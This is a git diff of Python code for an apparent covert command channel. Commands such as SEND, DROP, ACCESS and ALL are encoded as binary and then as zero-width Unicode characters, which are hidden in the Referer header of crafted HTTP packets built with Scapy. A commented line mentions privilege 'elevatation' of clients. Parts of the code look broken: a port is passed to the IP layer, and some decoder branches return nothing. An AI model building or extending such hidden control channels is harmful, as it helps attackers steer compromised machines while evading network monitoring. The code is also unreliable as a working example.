@@ -13,11 +13,9 @@ disconnect = "0001"
 clients = "0010"
 echo = "0011"
 drop = "0100"
-ALL = "0101"
+access = "0101"
+all = "0110"
 
-
-final_res = ''
-final_final_res = ''
 
 ''' CONTIANS CODE USED BY BOTH SERVER AND CLIENT'''
 def binary_converter(message):
@@ -25,7 +23,7 @@ def binary_converter(message):
     message2 = message
     msg_list = message2.split()
     if msg_list[0] == 'ALL':
-        res = ALL
+        res = all
         if msg_list[1] == 'SEND':
             res = res + send
             command_len = 9 # len('ALL SEND') + 1
@@ -39,13 +37,15 @@ def binary_converter(message):
         res = drop
     elif msg_list[0] == 'CLIENTS':
         res = clients
+    elif msg_list[0] == 'ACCESS':
+        res = access
 
     return res
     # binary_to_unicode(res)
 
 
 def binary_to_unicode(message):
-    global final_res
+    final_res = ''
     print("LEN: " + str(len(message)))
     for i in message:
         if i == '0':
@@ -57,7 +57,7 @@ def binary_to_unicode(message):
 def unicode_to_binary(message):
     index1 = 0
     index2 = 3
-    global final_final_res
+    final_final_res = ''
 
     while index1 < len(message):
         if message[index1:index2] == b'\xe2\x80\x8c':
@@ -75,26 +75,39 @@ def binary_deconverter(message):
     index2 = 12
     command = ''
     new_message = ''
-    if message[0:4] == "0000":
-        command = "SEND"
-    if message[0:4] == "0001":
-        command = "DISCONNECT"
-    if message[0:4] == "0010":
+
+    if message[0:4] == "0110":
+        command = "ALL"
+        if message[4:8] == "0000":
+            command += " "
+            command += "SEND"
+            index1 = 8
+            index2 = 16
+            while index1 < len(message):
+                character = chr(int(message[index1:index2], 2))
+                new_message += character
+                index1 += 8
+                index2 += 8
+            return command + ' ' + new_message
+        if message[4:8] == "0001":
+            command += " "
+            command += "DISCONNECT"
+            return command
+        if message[4:8] == "0011":
+            command += " "
+            command += "ECHO"
+            return command
+    # if message[0:4] == "0000":
+    #     command = "SEND"
+    elif message[0:4] == "0010":
         command = "CLIENTS"
-    if message[0:4] == "0011":
-        command = "ECHO"
-    if message[0:4] == "0100":
+        return command
+    elif message[0:4] == "0100":
         command = "DROP"
-    if message[0:4] == "0101":
+        return command
+    elif message[0:4] == "0101":
         command = "ACCESS"
-
-    while index1 < len(message):
-        character = chr(int(message[index1:index2], 2))
-        new_message += character
-        index1 += 8
-        index2 += 8
-
-    return command + ' ' + new_message
+        return command
 
 def parser(self, message):
         message_tmp = message.split()
@@ -122,13 +135,13 @@ def parser(self, message):
         #         elif command == "DROP" and len(message) == 1:
         #                 client_instance.elevatation()
 
-def construct_packet(ip, input):
+def construct_packet(addr, input):
         r_input = binary_converter(input)
         # print(r_input)
         r_input = binary_to_unicode(r_input)
         # print(r_input)
 
-        packet = IP(dst=ip)/HTTP()/HTTPRequest(
+        packet = IP(dst=addr[0], port=addr[1])/HTTP()/HTTPRequest(
                     Referer=r_input
                 )
         return bytes(packet)
